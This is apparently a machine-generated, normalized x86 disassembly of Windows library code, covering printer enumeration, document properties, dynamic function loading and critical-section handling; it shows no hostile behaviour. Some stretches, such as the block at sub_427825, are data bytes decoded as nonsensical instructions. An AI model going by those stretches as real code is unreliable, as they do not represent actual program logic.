mov eax [ esi + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ esi + 0x28 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_426b14
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_426c32
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ esi + 0x1f ]
cmp bl al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c39
lea eax [ ebp - 0x8 ]
call sub_404094
retn
xor edi edi
mov edx ebx
sub dl 0x1
jb r-xdata
xor edx edx
mov eax esi
call sub_426c40
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
je r-xdata
mov eax [ esi + 0x20 ]
push eax
call DeleteDC
xor eax eax
mov [ esi + 0x20 ] eax
jmp r-xdata
xor edx edx
call sub_41e2b4
cmp al 0x2
je r-xdata
dec dl
je r-xdata
test edi edi
je r-xdata
mov edi r-xdata
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov [ esi + 0x1f ] bl
mov eax esi
call sub_426fd4
push eax
mov eax esi
call sub_426fec
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_404554
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_404554
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_404554
push eax
call edi
mov [ esi + 0x20 ] eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
xor edx edx
call sub_41e2b4
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x8 ]
call sub_4268e0
mov edi r-xdata
push eax
call DeleteDC
mov edx [ esi + 0x20 ]
call sub_41e2b4
sub_426c40
push ebp
mov ebp esp
push 0x0
push 0x0
xor ecx ecx
push ebp
push sub_426ca5
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp dl [ eax + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426cac
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
test dl dl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x8 ]
call sub_4268e0
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x4 ]
call sub_4268e0
jmp r-xdata
sub_426cb0
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_426c40
mov eax [ ebx + 0x20 ]
push eax
call EndPage
cmp [ ebx + 0x1d ] 0x0
jne r-xdata
mov [ ebx + 0x1c ] 0x0
mov [ ebx + 0x1d ] 0x0
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
push eax
call EndDoc
sub_426ce4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_426fd4
push eax
mov eax ebx
call sub_426fec
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
mov eax [ esi + 0x8 ]
call sub_404554
mov edx eax
mov eax edi
call sub_4089c8
mov eax [ esi + 0x4 ]
call sub_404554
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4089c8
mov eax [ esi + 0xc ]
call sub_404554
mov edx eax
mov eax [ ebp + 0xc ]
call sub_4089c8
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x28 ]
mov [ eax ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_426d50
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ ebx + 0x1e ] al
test esi 0x1
je r-xdata
test esi 0x100
je r-xdata
or [ ebx + 0x1e ] 0x2
test esi 0x8000
je r-xdata
or [ ebx + 0x1e ] 0x1
pop esi
pop ebx
retn
or [ ebx + 0x1e ] 0x4
sub_426d8c
push ebp
mov ebp esp
add esp 0xffffff3c
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_426fc3
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_426c40
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
test eax eax
je r-xdata
mov eax ebx
call sub_427468
mov eax [ ebx + 0x2c ]
test eax eax
je r-xdata
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
mov edx [ edi + 0x28 ]
mov eax ebx
call sub_426d50
mov [ ebx + 0x28 ] esi
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor edx edx
mov eax ebx
call sub_426b14
mov [ ebp - 0xc ] 0xffffffff
mov eax ebx
call sub_426fec
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
push eax
call ClosePrinter
xor eax eax
mov [ ebx + 0x2c ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0xc ]
mov [ ebx + 0x14 ] eax
push 0x0
lea eax [ ebx + 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_426978
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0xb4 ]
mov edx [ ebp - 0x4 ]
mov [ ebp - 0xc4 ] edx
mov [ ebp - 0xc0 ] 0x6
mov edx [ ebp + 0xc ]
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xb8 ] 0x6
lea edx [ ebp - 0xc4 ]
mov ecx 0x1
call sub_409094
mov edx [ ebp - 0xb0 ]
mov eax [ ebx + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0xc
mov edx [ ebp + 0xc ]
call sub_40428c
mov [ ebp - 0xc ] esi
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426fca
lea eax [ ebp - 0xb4 ]
mov edx 0x2
call sub_4040b8
retn
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_4269d8
test al al
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0xac ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
push eax
push 0x42
call GlobalAlloc
mov esi eax
mov [ ebx + 0x28 ] esi
test esi esi
je r-xdata
mov eax [ ebx + 0x24 ]
mov edx [ eax + 0x28 ]
mov eax ebx
call sub_426d50
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
push 0x2
push edi
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
test eax eax
jge r-xdata
mov eax [ ebx + 0x28 ]
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x28 ] eax
sub_426fec
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42721b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edi ebx
xor edx edx
push ebp
push sub_4271d8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov esi 0x2
mov bl 0x5
mov esi 0x6
mov bl 0x4
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026f4
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4271c7
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0xc ]
push eax
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
dec eax
test eax eax
jl r-xdata
call sub_403b7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427222
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_4040b8
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_402714
retn
inc eax
mov [ ebp - 0x1c ] eax
mov esi [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
call sub_4268ac
mov edi eax
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov edi [ esi ]
push edi
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_426978
push eax
lea eax [ ebp - 0x20 ]
mov edx edi
call sub_40428c
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
add [ ebp - 0x10 ] 0xc
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ esi ]
push eax
push edi
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_426978
push eax
lea eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x28 ]
mov edx [ esi ]
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x34 ] 0x6
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] 0x6
lea edx [ ebp - 0x38 ]
mov ecx 0x1
call sub_409094
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
lea eax [ ebp - 0x8 ]
call sub_4268ac
mov edi eax
add [ ebp - 0x10 ] 0x14
cmp bl 0x4
jne r-xdata
sub_42722c
push ebp
mov ebp esp
add esp 0xfffffbdc
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x424 ] edx
mov [ ebp - 0x420 ] edx
mov [ ebp - 0x41c ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427409
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push 0x5
push 0x0
push 0x1
call EnumPrintersA
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_407e2c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4273c9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x5
push 0x0
push 0x1
call EnumPrintersA
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
call GetLastError
cmp eax 0x7a
je r-xdata
push 0x3ff
lea eax [ ebp - 0x418 ]
push eax
push r-xdata
push r-xdata
push r-xdata
call GetProfileStringA
lea eax [ ebp - 0x418 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
call sub_4268ac
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
call GetLastError
cmp eax 0x7b
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_402714
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_426fec
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
call sub_40d144
lea edx [ ebp - 0x41c ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x41c ]
call sub_4268e0
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_404554
push eax
push 0x0
mov eax [ ebx + 0x4 ]
call sub_404554
push eax
mov eax [ ebx + 0x8 ]
call sub_404554
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_426d8c
call sub_403b7c
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x420 ]
mov edx [ ebp - 0x14 ]
call sub_40428c
mov edx [ ebp - 0x420 ]
pop eax
call sub_4080c8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427410
lea eax [ ebp - 0x424 ]
mov edx 0x3
call sub_4040b8
retn
sub_42742c
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x10 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
lea eax [ esi + 0x10 ]
call sub_40d6a0
inc eax
mov ebx eax
xor edi edi
mov edx edi
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403344
inc edi
dec ebx
jne r-xdata
sub_427494
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4274c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4274cc
retn
mov eax [ rw-data ]
call sub_403344
sub_4274d8
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42750c
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_427534
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_4277b6
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4277dd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4277e4
retn
sub_427825
xor eax 0x35980040
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add ah al
js r-xdata
xor eax 0x35980040
add al cl
js r-xdata
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
inc eax
add al bh
xor eax 0x359c0040
inc eax
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
add [ esi ] cl
push esp
push ebx
jns r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
mov eax esi
call sub_403334
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
retn
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x58 ] si
js r-xdata
xor al [ eax ]
or al 0x79
inc edx
add [ ecx + edi * 2 ] bh
inc edx
add [ eax + 0x79 ] cl
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c004278 ] dh
add [ eax ] al
add al bh
ja r-xdata
lea eax [ eax ]
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
add [ ebp + esi + 0x35980040 ] cl
sub_4278cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403314
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42790c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_427964
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427989
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427990
retn
sub_42799c
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_427954
xor eax eax
push ebp
push sub_427b53
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427b5a
mov eax [ rw-data ]
call sub_42795c
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_427b5c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_427954
xor eax eax
push ebp
push sub_427f0f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427f16
mov eax [ rw-data ]
call sub_42795c
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_4282c0
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_4282e8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428330
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428337
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403344
call sub_42799c
cmp [ rw-data ] 0x0
jg r-xdata
sub_428358
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42837d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428384
retn
sub_428390
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4283b5
push [ fs : eax ]
